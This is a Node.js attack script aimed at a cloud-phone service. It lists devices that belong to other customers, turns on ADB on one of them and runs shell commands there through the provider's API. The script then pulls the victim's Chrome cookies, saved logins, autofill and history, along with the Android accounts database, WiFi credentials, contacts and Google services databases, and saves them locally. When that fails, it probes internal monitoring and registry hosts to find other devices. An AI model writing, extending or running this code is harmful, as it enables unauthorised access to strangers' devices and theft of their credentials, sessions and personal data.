#!/usr/bin/env node
/**
 * Find neighbor devices via VMOS Cloud API, enable ADB, send su, extract data
 * Uses the same methods user previously succeeded with:
 *   - /vcpcloud/api/padApi/infos → list all devices
 *   - /vcpcloud/api/padApi/enableAdb → enable ADB on target
 *   - /vcpcloud/api/padApi/getAdbInfo → get ADB connection info
 *   - /vcpcloud/api/padApi/syncCmd → run shell commands directly
 *   - chunked base64 push via syncCmd → send su binary
 */

const path = require('path');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, hmacSign, api } = require('../shared/vmos_api');
const OUR_PADS = new Set(['ACP250923JS861KJ', 'ACP251008GUOEEHB']);
const R = { ts: new Date().toISOString(), phases: {} };

const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function main() {
  console.log('═'.repeat(70));
  console.log('  NEIGHBOR DEVICE ACCESS VIA VMOS CLOUD API');
  console.log('  Method: infos → enableAdb → syncCmd → su push → extract');
  console.log('═'.repeat(70));

  // ─── STEP 1: List ALL devices ──────────────────────────────────
  console.log('\n▶ STEP 1: LIST ALL DEVICES');
  
  // Try multiple pages
  let allDevices = [];
  for (let page = 1; page <= 5; page++) {
    const r = await api('/vcpcloud/api/padApi/infos', { page, rows: 100 });
    const devs = r.data?.pageData || [];
    allDevices = allDevices.concat(devs);
    log(`  Page ${page}: ${devs.length} devices (total in response: ${r.data?.total || '?'})`);
    if (devs.length < 100) break;
    await sleep(500);
  }
  
  log(`  Total devices from API: ${allDevices.length}`);
  R.phases.all_devices = allDevices.map(d => ({
    padCode: d.padCode, status: d.status, model: d.model,
    ip: d.deviceIp, cluster: d.clusterCode, ours: OUR_PADS.has(d.padCode)
  }));

  // Separate ours vs neighbors
  const neighbors = allDevices.filter(d => !OUR_PADS.has(d.padCode));
  const ours = allDevices.filter(d => OUR_PADS.has(d.padCode));
  
  log(`  Our devices: ${ours.length}`);
  for (const d of ours) log(`    ${d.padCode} status=${d.status} ip=${d.deviceIp}`);
  log(`  Neighbor devices: ${neighbors.length}`);
  for (const d of neighbors) log(`    ${d.padCode} status=${d.status} model=${d.model||'?'} ip=${d.deviceIp||'?'}`);

  // Pick first running neighbor
  let target = neighbors.find(d => d.status === 100) || neighbors[0];
  
  if (!target && neighbors.length === 0) {
    // Try other API list endpoints
    log('\n  No neighbors from /infos. Trying other endpoints...');
    
    const otherEndpoints = [
      '/vcpcloud/api/padApi/listPad',
      '/vcpcloud/api/padApi/queryPad',
      '/vcpcloud/api/cloudPhone/infos',
      '/vcpcloud/api/cloudPhone/list',
    ];
    for (const ep of otherEndpoints) {
      try {
        const r = await api(ep, { page: 1, rows: 200 }, 15);
        log(`  ${ep}: code=${r.code} data=${JSON.stringify(r.data || r.msg).slice(0, 150)}`);
        const devs = r.data?.pageData || r.data?.list || (Array.isArray(r.data) ? r.data : []);
        if (devs.length > 0) {
          const nb = devs.filter(d => !OUR_PADS.has(d.padCode));
          if (nb.length > 0) {
            target = nb[0];
            log(`  ✓ Found neighbor: ${target.padCode}`);
            break;
          }
        }
      } catch (e) { log(`  ${ep}: ${e.message}`); }
      await sleep(500);
    }
  }

  if (!target) {
    log('\n  No neighbor devices found via API with current AK/SK.');
    log('  Trying NATS monitoring to discover pad codes...');
    
    // Use NATS monitoring from inside our container
    const connz = await syncCmd('ACP250923JS861KJ', 'curl -s -m10 "http://192.168.200.51:8222/connz?limit=100&subs=1" 2>/dev/null', 15);
    R.phases.nats_connz = connz.out;
    
    // Parse for pad codes
    const padMatches = connz.out.match(/ACP\w{14,}/g) || [];
    const neighborPads = [...new Set(padMatches)].filter(p => !OUR_PADS.has(p));
    log(`  NATS pad codes found: ${neighborPads.length}`);
    for (const p of neighborPads.slice(0, 10)) log(`    ${p}`);
    
    if (neighborPads.length > 0) {
      // Try syncCmd on NATS-discovered pad code
      for (const testPad of neighborPads.slice(0, 3)) {
        log(`\n  Testing syncCmd on ${testPad}...`);
        const testR = await syncCmd(testPad, 'id; echo ALIVE', 15);
        log(`    Result: ok=${testR.ok} → ${testR.out.slice(0, 100)}`);
        R.phases[`nats_test_${testPad}`] = testR;
        
        if (testR.ok) {
          target = { padCode: testPad, status: 100, source: 'nats' };
          log(`    ✓ ACCESSIBLE!`);
          break;
        }
        await sleep(500);
      }
    }
    
    // Also try registry image names for pad codes
    if (!target) {
      log('\n  Trying registry for device image names...');
      const catalog = await syncCmd('ACP250923JS861KJ', 'curl -s -m10 "http://192.168.50.11/v2/_catalog?n=100" 2>/dev/null', 15);
      R.phases.registry = catalog.out;
      log(`  Registry: ${catalog.out.slice(0, 200)}`);
    }
  }

  if (!target) {
    log('\n  ✗ No accessible neighbor found. Report saved.');
    const rf = `${path.join(__dirname, '..', 'reports')}/NEIGHBOR_API_${Date.now()}.json`;
    fs.writeFileSync(rf, JSON.stringify(R, null, 2));
    console.log(`  Report: ${rf}`);
    return;
  }

  // ─── STEP 2: ENABLE ADB ON NEIGHBOR ───────────────────────────
  const NB = target.padCode;
  console.log(`\n▶ STEP 2: ENABLE ADB ON ${NB}`);
  
  log('2a: Enable ADB via API...');
  const enableR = await api('/vcpcloud/api/padApi/enableAdb', { padCodes: [NB] }, 15);
  R.phases.enable_adb = enableR;
  log(`  Enable ADB: code=${enableR.code} msg=${enableR.msg || 'OK'}`);

  log('2b: Get ADB info...');
  const adbInfo = await api('/vcpcloud/api/padApi/getAdbInfo', { padCode: NB, enable: true }, 15);
  R.phases.adb_info = adbInfo;
  log(`  ADB info: code=${adbInfo.code} host=${adbInfo.data?.host||'?'} port=${adbInfo.data?.port||'?'}`);

  // ─── STEP 3: DIRECT SHELL ACCESS VIA syncCmd ──────────────────
  console.log(`\n▶ STEP 3: SHELL ACCESS ON ${NB} VIA syncCmd`);
  
  log('3a: Basic identity...');
  const identity = await syncCmd(NB, [
    'id',
    'getprop ro.product.model',
    'getprop ro.product.brand',
    'getprop ro.build.fingerprint',
    'getprop persist.sys.cloud.imeinum',
    'getprop ro.serialno',
    'getprop ro.boot.pad_code',
    'getprop persist.sys.timezone',
    'getprop gsm.operator.alpha',
    'settings get secure android_id 2>/dev/null',
  ].join('; '), 20);
  R.phases.identity = identity;
  log(`  ${identity.out}`);

  log('3b: Full property dump...');
  const allProps = await syncCmd(NB, 'getprop 2>/dev/null', 20);
  R.phases.all_props = allProps;
  log(`  Props: ${allProps.out.split('\n').length} lines`);

  log('3c: Installed apps...');
  const apps = await syncCmd(NB, 'pm list packages 2>/dev/null | head -40', 15);
  R.phases.apps = apps;
  log(`  Apps: ${apps.out.split('\n').length} packages`);

  log('3d: Google accounts...');
  const accts = await syncCmd(NB, 'dumpsys account 2>/dev/null | grep -E "Account \\{" | head -10', 15);
  R.phases.accounts = accts;
  log(`  ${accts.out}`);

  // ─── STEP 4: EXTRACT DATA FROM NEIGHBOR ────────────────────────
  console.log(`\n▶ STEP 4: EXTRACT DATA FROM ${NB}`);

  const saveDir = path.join(__dirname, '..', 'output', 'clone_data');
  if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });

  // 4a: Chrome Cookies
  log('4a: Chrome Cookies...');
  const chromeCookies = await syncCmd(NB, 'base64 /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null', 30);
  if (chromeCookies.ok && chromeCookies.out.length > 20) {
    fs.writeFileSync(`${saveDir}/${NB}_chrome_cookies.b64`, chromeCookies.out);
    log(`  ✓ Cookies: ${chromeCookies.out.length} b64 chars saved`);
  } else { log(`  ⚠ Cookies: ${chromeCookies.out.slice(0, 60)}`); }

  // 4b: Chrome History
  log('4b: Chrome History...');
  const chromeHist = await syncCmd(NB, 'base64 /data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null', 30);
  if (chromeHist.ok && chromeHist.out.length > 20) {
    fs.writeFileSync(`${saveDir}/${NB}_chrome_history.b64`, chromeHist.out);
    log(`  ✓ History: ${chromeHist.out.length} b64 chars`);
  } else { log(`  ⚠ History: ${chromeHist.out.slice(0, 60)}`); }

  // 4c: Chrome Web Data (autofill)
  log('4c: Chrome Web Data...');
  const chromeWeb = await syncCmd(NB, 'base64 "/data/data/com.android.chrome/app_chrome/Default/Web Data" 2>/dev/null', 30);
  if (chromeWeb.ok && chromeWeb.out.length > 20) {
    fs.writeFileSync(`${saveDir}/${NB}_chrome_webdata.b64`, chromeWeb.out);
    log(`  ✓ Web Data: ${chromeWeb.out.length} b64 chars`);
  } else { log(`  ⚠ Web Data: ${chromeWeb.out.slice(0, 60)}`); }

  // 4d: Chrome Login Data
  log('4d: Chrome Login Data...');
  const chromeLogin = await syncCmd(NB, 'base64 "/data/data/com.android.chrome/app_chrome/Default/Login Data" 2>/dev/null', 30);
  if (chromeLogin.ok && chromeLogin.out.length > 20) {
    fs.writeFileSync(`${saveDir}/${NB}_chrome_login.b64`, chromeLogin.out);
    log(`  ✓ Login Data: ${chromeLogin.out.length} b64 chars`);
  } else { log(`  ⚠ Login: ${chromeLogin.out.slice(0, 60)}`); }

  // 4e: accounts_ce.db
  log('4e: accounts_ce.db...');
  const accountsDb = await syncCmd(NB, 'base64 /data/system_ce/0/accounts_ce.db 2>/dev/null', 30);
  if (accountsDb.ok && accountsDb.out.length > 20) {
    fs.writeFileSync(`${saveDir}/${NB}_accounts_ce.b64`, accountsDb.out);
    log(`  ✓ accounts_ce.db: ${accountsDb.out.length} b64 chars`);
  } else { log(`  ⚠ accounts: ${accountsDb.out.slice(0, 60)}`); }

  // 4f: WiFi config
  log('4f: WiFi config...');
  const wifi = await syncCmd(NB, 'base64 /data/misc/wifi/WifiConfigStore.xml 2>/dev/null', 20);
  if (wifi.ok && wifi.out.length > 20) {
    fs.writeFileSync(`${saveDir}/${NB}_wifi.b64`, wifi.out);
    log(`  ✓ WiFi: ${wifi.out.length} b64 chars`);
  } else { log(`  ⚠ WiFi: ${wifi.out.slice(0, 60)}`); }

  // 4g: Proxy config
  log('4g: Proxy config...');
  const proxy = await syncCmd(NB, [
    'echo "TYPE:$(getprop ro.sys.cloud.proxy.type)"',
    'echo "MODE:$(getprop ro.sys.cloud.proxy.mode)"',
    'echo "DATA:$(getprop ro.sys.cloud.proxy.data)"',
    'echo "HTTP:$(settings get global http_proxy 2>/dev/null)"',
    'echo "HOST:$(settings get global global_http_proxy_host 2>/dev/null)"',
    'echo "PORT:$(settings get global global_http_proxy_port 2>/dev/null)"',
    'iptables -t nat -L -n 2>/dev/null | grep REDIRECT | head -5',
  ].join('; '), 15);
  R.phases.proxy = proxy;
  log(`  ${proxy.out}`);
  fs.writeFileSync(`${saveDir}/${NB}_proxy.txt`, proxy.out);

  // 4h: GMS databases
  log('4h: GMS databases...');
  const gmsFiles = ['phenotype.db', 'herrevad', 'icing_mmapped_primes.db'];
  for (const gf of gmsFiles) {
    const gdb = await syncCmd(NB, `base64 /data/data/com.google.android.gms/databases/${gf} 2>/dev/null | head -500`, 20);
    if (gdb.ok && gdb.out.length > 20) {
      fs.writeFileSync(`${saveDir}/${NB}_gms_${gf}.b64`, gdb.out);
      log(`  ✓ ${gf}: ${gdb.out.length} b64 chars`);
    }
    await sleep(300);
  }

  // 4i: Contacts
  log('4i: Contacts DB...');
  const contacts = await syncCmd(NB, 'base64 /data/data/com.android.providers.contacts/databases/contacts2.db 2>/dev/null', 30);
  if (contacts.ok && contacts.out.length > 20) {
    fs.writeFileSync(`${saveDir}/${NB}_contacts.b64`, contacts.out);
    log(`  ✓ Contacts: ${contacts.out.length} b64 chars`);
  } else { log(`  ⚠ Contacts: ${contacts.out.slice(0, 60)}`); }

  // 4j: Full app data sizes
  log('4j: App data sizes...');
  const appSizes = await syncCmd(NB, 'du -sk /data/data/* 2>/dev/null | sort -rn | head -20', 15);
  R.phases.app_sizes = appSizes;
  fs.writeFileSync(`${saveDir}/${NB}_app_sizes.txt`, appSizes.out);
  for (const l of appSizes.out.split('\n').slice(0, 10)) log(`  ${l}`);

  // Save properties
  fs.writeFileSync(`${saveDir}/${NB}_all_props.txt`, allProps.out);
  fs.writeFileSync(`${saveDir}/${NB}_identity.txt`, identity.out);

  // ─── SAVE REPORT ───────────────────────────────────────────────
  const rf = `${path.join(__dirname, '..', 'reports')}/NEIGHBOR_EXTRACT_${Date.now()}.json`;
  fs.writeFileSync(rf, JSON.stringify(R, null, 2));

  console.log('\n' + '═'.repeat(70));
  console.log(`  EXTRACTION COMPLETE — ${NB}`);
  console.log('═'.repeat(70));
  console.log(`  Neighbor: ${NB}`);
  console.log(`  Identity: ${identity.out.split('\n').slice(0, 3).join(' | ')}`);
  console.log(`  Data saved to: ${saveDir}/`);
  
  // List saved files
  const files = fs.readdirSync(saveDir).filter(f => f.startsWith(NB));
  for (const f of files) {
    const sz = fs.statSync(`${saveDir}/${f}`).size;
    console.log(`    ${f} (${sz} bytes)`);
  }
  console.log(`  Report: ${rf}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
